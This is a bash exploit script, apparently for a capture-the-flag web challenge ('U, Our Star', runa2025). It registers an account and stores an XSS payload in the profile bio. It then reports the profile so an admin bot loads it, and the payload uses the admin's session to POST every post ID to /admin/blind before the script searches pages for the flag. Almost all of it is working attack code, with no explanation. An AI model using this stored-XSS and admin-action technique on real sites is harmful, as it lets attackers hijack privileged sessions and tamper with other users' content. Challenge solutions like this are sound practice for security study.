#!/bin/bash
# Exploit for U, Our Star

BASE_URL="http://web.runa2025.kr:5005"
COOKIE_JAR=$(mktemp)
USERNAME="attacker_$(date +%s)"
PASSWORD="password123"

echo "[*] Starting U, Our Star exploit"
echo "[*] Target: $BASE_URL"
echo ""

# 1. Register account
echo "[1] Creating account: $USERNAME"
curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  -X POST "$BASE_URL/auth/register" \
  -d "username=$USERNAME&password=$PASSWORD&age=25&mbti=ISTJ&sex=ë‚¨" \
  > /dev/null
echo "[+] Account created"

# 2. Get CSRF token from profile page
echo "[2] Getting CSRF token..."
CSRF=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  "$BASE_URL/user/profile/$USERNAME" | grep '_csrf' | head -1 | sed 's/.*value="\([^"]*\)".*/\1/')

if [ -z "$CSRF" ]; then
  echo "[-] No CSRF token found, proceeding without it"
  CSRF=""
fi
echo "[*] CSRF token: ${CSRF:-'not found'}"

# 3. Create XSS payload
XSS_PAYLOAD='<img src=x onerror="
  (async () => {
    try {
      const csrf = document.getElementById(\"csrfToken\")?.value || \"\";
      const resp = await fetch(\"/\");
      const html = await resp.text();
      const postIds = html.match(/\/post\/([a-f0-9-]+)/g) || [];
      for (const postLink of postIds) {
        const postId = postLink.split(\"/\")[2];
        await fetch(\"/admin/blind\", {
          method: \"POST\",
          headers: { \"Content-Type\": \"application/x-www-form-urlencoded\" },
          body: \"_csrf=\" + encodeURIComponent(csrf) + \"&postId=\" + postId
        }).catch(e => {});
      }
    } catch(e) {}
  })();
">'

# 4. Update profile with XSS
echo "[3] Injecting XSS payload into profile..."
curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  -X POST "$BASE_URL/user/profile/$USERNAME" \
  -d "bio=$(echo -n "$XSS_PAYLOAD" | sed 's/&/%26/g; s/=/%3D/g; s/ /%20/g; s/\"/%22/g; s/\//%2F/g')&theme=" \
  > /dev/null
echo "[+] Profile updated"

# 5. Submit report
echo "[4] Submitting report to trigger admin visit..."
curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  -X POST "$BASE_URL/report" \
  -d "username=$USERNAME" \
  > /dev/null
echo "[+] Report submitted"

# 6. Wait for admin
echo "[5] Waiting 15 seconds for admin to visit..."
sleep 15

# 7. Check for flag
echo "[6] Checking for flag..."
curl -s -b "$COOKIE_JAR" "$BASE_URL/" > /tmp/home.html
if grep -q "runa2025{" /tmp/home.html; then
  echo "[+] FLAG FOUND!"
  grep -o "runa2025{[^}]*}" /tmp/home.html | head -1
else
  echo "[-] Flag not found in home page"
  echo "[*] Checking all posts..."
  # Extract post IDs and check each
  POSTS=$(grep -o "/post/[a-f0-9-]*" /tmp/home.html | sort -u)
  for POST in $POSTS; do
    POST_ID=$(echo "$POST" | sed 's|/post/||')
    curl -s -b "$COOKIE_JAR" "$BASE_URL/post/$POST_ID" | grep -o "runa2025{[^}]*}" && break
  done
fi

rm -f "$COOKIE_JAR" /tmp/home.html
